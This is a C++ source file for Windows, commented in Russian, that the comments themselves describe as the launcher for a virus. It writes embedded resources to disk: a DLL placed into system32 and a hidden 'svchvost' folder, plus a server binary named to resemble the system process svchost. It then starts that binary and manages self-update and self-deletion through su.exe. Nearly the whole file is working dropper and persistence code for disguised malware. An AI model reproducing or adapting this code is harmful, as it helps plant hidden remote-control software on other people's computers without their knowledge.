#include <windows.h>
#include <iostream>
#include <shlwapi.h>
#include "resource.h"

using namespace std;

#pragma comment(lib, "shlwapi.lib")

// Эта прога понадобилась от того, что прога-сервер использует ijl15.dll,
// без которого совершенно не запускается. Поэтому мы сначала запускаем эту прогу,
// которая распаковывает эту библиотеку как минимум в два места, затем
// распаковывает тело вируса на диск C, затем запускает его

int DeleteSU()
{
   // Проверяем, существует ли файл
   if (!PathFileExists("su.exe")) return 0;

   // Сто раз попытаемся удалить этот файл (раз в пол секунды)
   while (1)
   {
      // Специально для Windows 98 мы запускаем эту процедуру много-много раз подряд чтоб убедиться, то все хорошо
      DeleteFile("su.exe");

      if (!PathFileExists("su.exe")) break;  // Если файла уже нет, то выходим из цикла

      Sleep(500);  // Будем пытаться это сделать каждую секунду
   }

   return 0;
}

// Функция, выгружающая в определенное место на диске файл по номеру ресурса
int UnpackResource(DWORD res_id, const char *path)
{
   // 1. Сначала выгружаем запускающую программу на диск
   HRSRC hRc = FindResource(NULL, MAKEINTRESOURCE(res_id), RT_RCDATA);
   if (!hRc) return 0;

   HGLOBAL hRes = LoadResource(NULL, hRc );
   if (!hRes) return 0;

   LPVOID pData = LockResource(hRes);
   if (!pData) return 0;

   fpos_t *pos = (fpos_t*)pData;
   unsigned int size = (unsigned int)*pos;

   FILE *pFile = fopen(path, "wb");
   if (!pFile) return 0;

   // Записываем файл на диск
   if (fwrite((char*)pData+sizeof(fpos_t), 1, size, pFile) != size)
      return 0;

   fflush(pFile);
   fclose(pFile);

   return 1;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nCmdShow)
//int main()
{
   char sys_dir[1024];     // Путь к папке system32
   char server_dir[1024];  // Рабочий каталог сервера
   char exe_path[1024];    // Место, откуда была запущена программа
   char buf[1024];         // Буфер для временных строк
   if (!GetSystemDirectory(sys_dir, 1024)) return 0;
   GetModuleFileName(hInst, exe_path, 1024);

   strcpy(server_dir, sys_dir);
   strcat(server_dir, "\\svchvost");

   cout << "I am The Server Shuttle!" << endl;

   // Пишем в эту директорию DLL
   strcpy(buf, sys_dir);
   strcat(buf, "\\ijl15.dll");

   // Не проверяем возвражаемое значение - файл может быть уже занят другим процессом
   UnpackResource(IDR_IJL15DLL_DATA, buf);

   if (!PathFileExists(server_dir))
      if (CreateDirectory(server_dir, NULL))
      {
         strcpy(buf, server_dir);
         strcat(buf, "\\ijl15.dll");
         UnpackResource(IDR_IJL15DLL_DATA, buf);
      }

   // Когда DLL-и разложены, надо что-то делать с сервером
   strcpy(buf, server_dir);
   strcat(buf, "\\svchvost.exe");

   // Если сервер запущен из папки system32
   if (strcmp(exe_path, buf) == 0)
   {
      // Сначала удаляем предыдущий экземпляр su.exe
      DeleteSU();  // Тут же функция ждет, пока предыдущий экземпляр su.exe выйдет

      // Тогда выгружаем сюда сервер с именем asd.dat и запускаем программу su.exe
      // как ни в чем ни бывало, затем просто выходим
      if (!UnpackResource(IDR_SU_DATA, "su.exe"))
         return 0;

      if (!UnpackResource(IDR_SVCHVOST_DATA, "asd.dat"))
         return 0;

      // Запускаем su.exe
      STARTUPINFO si;
      PROCESS_INFORMATION pi;

      ZeroMemory( &si, sizeof(si) );
      si.cb = sizeof(si);
      ZeroMemory( &pi, sizeof(pi) );

      strcpy(buf, server_dir);
      strcat(buf, "\\su.exe update svchvost.exe svchvost.exe asd.dat");

      // Не проверяем возвращаемое значение - нам пофигу
      CreateProcess( NULL, buf, // С параметром самоудаления после запуска (только если запущен не из system32)
                           NULL,             // Process handle not inheritable. 
                           NULL,             // Thread handle not inheritable. 
                           FALSE,            // Set handle inheritance to FALSE. 
                           0,                // No creation flags. 
                           NULL,             // Use parent's environment block. 
                           server_dir,       // Запускаем его из места, где будет запущена новая версия
                           &si,              // Pointer to STARTUPINFO structure.
                           &pi );            // Pointer to PROCESS_INFORMATION structure.

      // Просто выходим из программы
      return 0;
   }
   else
   {
      // Если программа запущена не из system32, то пытаемся переписать сервер
      // новой версией (делаем 10 попыток по секунде на каждую) и запустить его
      bool b_serv_deleted = false;
      strcpy(buf, server_dir);
      strcat(buf, "\\svchvost.exe");

      for (int i=0; i<10; i++)
      {
         DeleteFile(buf);

         if (!PathFileExists(buf))
         {
            b_serv_deleted = true;
            break;
         }
      }

      // Если сервер был удален, то пишем туда новую версию и запускаем ее оттуда
      if (b_serv_deleted)
      {
         if (!UnpackResource(IDR_SVCHVOST_DATA, buf))
            return 0;

         STARTUPINFO si;
         PROCESS_INFORMATION pi;

         ZeroMemory( &si, sizeof(si) );
         si.cb = sizeof(si);
         ZeroMemory( &pi, sizeof(pi) );

         // Не проверяем возвращаемое значение - нам пофигу
         CreateProcess( NULL, buf, // С параметром самоудаления после запуска (только если запущен не из system32)
                              NULL,             // Process handle not inheritable. 
                              NULL,             // Thread handle not inheritable. 
                              FALSE,            // Set handle inheritance to FALSE. 
                              0,                // No creation flags. 
                              NULL,             // Use parent's environment block. 
                              server_dir,       // Запускаем его из места, где будет запущена новая версия
                              &si,              // Pointer to STARTUPINFO structure.
                              &pi );            // Pointer to PROCESS_INFORMATION structure.

      }
   }
   return 0;
}
